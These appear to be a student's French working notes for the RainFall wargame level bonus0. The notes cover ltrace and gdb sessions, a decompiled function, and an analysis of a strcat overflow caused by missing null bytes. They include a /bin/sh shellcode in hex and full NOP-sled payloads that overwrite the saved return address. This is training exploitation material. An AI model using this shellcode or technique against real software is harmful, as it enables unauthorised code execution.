bonus0@RainFall:~$ ltrace ./bonus0 
__libc_start_main(0x80485a4, 1, 0xbffff6f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - )                                      = 4
read(0, lol"lol\n", 4096)                           = 4
strchr("lol\n", '\n')                               = "\n"
strncpy(0xbffff5d8, "lol", 20)                      = 0xbffff5d8
puts(" - " - )                                      = 4
read(0, lol"lol\n", 4096)                           = 4
strchr("lol\n", '\n')                               = "\n"
strncpy(0xbffff5ec, "lol", 20)                      = 0xbffff5ec
strcpy(0xbffff626, "lol")                           = 0xbffff626
strcat("lol ", "lol")                               = "lol lol"
puts("lol lol"lol lol)                              = 8

En testant 20 * A dans le premier read et 20 * B dans le deuxieme
En mettant un break point a la fin du main j'arrive a obtenir une valeur de ebp modifier

ebp            0x42424242       0x42424242
eip = 0x80485cb in main; saved eip 0x42424242

Donc le retour de la fonction main est modifier
On va surement pouvoir envoyer un shellcode de cette maniere

On reprend notre shellcode : "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

40 pour le premier ?
Offset 9 pour le deuxieme read

0x bf ff f6 10
r < <(python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"' ; python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')


Chercher une valeur dans la memoire : 

(gdb) find START_ADDR, END_ADDR, VALEUR

Obtenir la plage memoire :

(gdb) info proc mappings

Exemple :

(gdb) find $esp, +1000, 0x41
(gdb) find $esp, +1000, 0x6a, 0x0b, 0x58, 0x99


Ok donc avec ca on reprend du debut parce que la c'est la cata cata

Avec breakpoint dans p()
Avant leave
(gdb) find $esp, +1000, 0x41414141
0xbfffe590
(gdb) find $esp, +1000, 0x42424242
0xbfffe590

Apres leave :
(gdb) find $esp, +1000, 0x41414141
0xbffff5c8
(gdb) find $esp, +1000, 0x42424242
0xbffff5dc



Avec breakpoint dans pp()
Avant leave :
(gdb) find $esp, +1000, 0x41414141
0xbffff616
(gdb) find $esp, +1000, 0x42424242
0xbffff61b
Pas de leave dans pp()

Avec breakpoint dans main()
(gdb) find $esp, +1000, 0x42424242
0xbffff61b
(gdb) find $esp, +1000, 0x41414141
0xbffff616
donc dans le contexte du main les adresses et valeurs sont identiques

Regardons apres le leave :
(gdb) find $esp, +1000, 0x42424242
Pattern not found.
(gdb) find $esp, +1000, 0x41414141
Pattern not found.

not found car %esp est mov dans %ebp donc le find ne trouve pas a partir de %esp mais les valeurs/adresses sont toujours bien la :

(gdb) x/x 0xbffff61b
0xbffff61b:     0x42424242
(gdb) x/x 0xbffff616
0xbffff616:     0x41414141

(gdb) find 0xbffff616, +1000, 0xb7e454d3
0xbffff64c
0xbffff64c:     0xb7e454d3

On a notre adresse a modifier et sa position dans la stack ! MAGNIFIKE MA CHERIE


r < <(python -c 'print "\x90"*20'; python -c 'print "\x90" * 9 +  "\x26\xf6\xff\xbf" + 16*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')


```c
char* pp(char* arg1) {
    char buffer1[48];  // [ebp-0x30]
    char buffer2[28];  // [ebp-0x1c]
    
    p(buffer1, data_80486a0);  // Premier input: AAAAA...
    p(buffer2, data_80486a0);  // Deuxième input: BBBBB...
    
    strcpy(arg1, buffer1);     // Copie AAAAA dans arg1
    
    size_t len = strlen(arg1); // Trouve la longueur de arg1
    arg1[len] = ' ';          // Ajoute un espace
    
    strcat(arg1, buffer2);     // Ajoute BBBBB à la suite
}
```

`arg1` est en fait le `str` déclaré dans le `main()`. C'est là qu'est la vulnérabilité:

1. `buffer1` contient 20 'A' (sans null byte)
2. `buffer2` contient 20 'B' (sans null byte)
3. Quand on copie `buffer1` dans `str`, on a 20 'A'
4. On ajoute un espace
5. Quand `strcat` ajoute `buffer2`, il va écrire les 20 'B' à la suite

Donc dans `str`, on va avoir:
```
AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
```

C'est 41 caractères dans un buffer de 42, mais comme il n'y a pas de null byte entre les A et les B, on peut déborder et écraser la mémoire au-delà de `str`.

La vulnérabilité est donc dans le fait qu'on peut écrire plus que la taille prévue de `str` grâce à l'absence de null bytes dans les `strncpy` précédents.


--> En realite le buffer est ecrit en memoire, seulent 20 bytes sont copier dans le strncpy mais on s'en fou frerot

r < <(python -c 'print "A"*20'; python -c 'print "B"*20')


(gdb) find $esp, +1000, 0x41414141
0xbffff706
0xbffff707
0xbffff708
0xbffff709
0xbffff70a
0xbffff70b
0xbffff70c
0xbffff70d
0xbffff70e
0xbffff70f
0xbffff710
0xbffff711
0xbffff712
0xbffff713
0xbffff714
0xbffff715
0xbffff716
17 patterns found.

find 0xbffdf000, +21000, 0x6a, 0x0b, 0x58, 0x99

0xbffff62a

r < <(python -c 'print "\x90"*20'; python -c 'print "\x90" * 9 +  "\x2a\xf6\xff\xbf" + 4*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')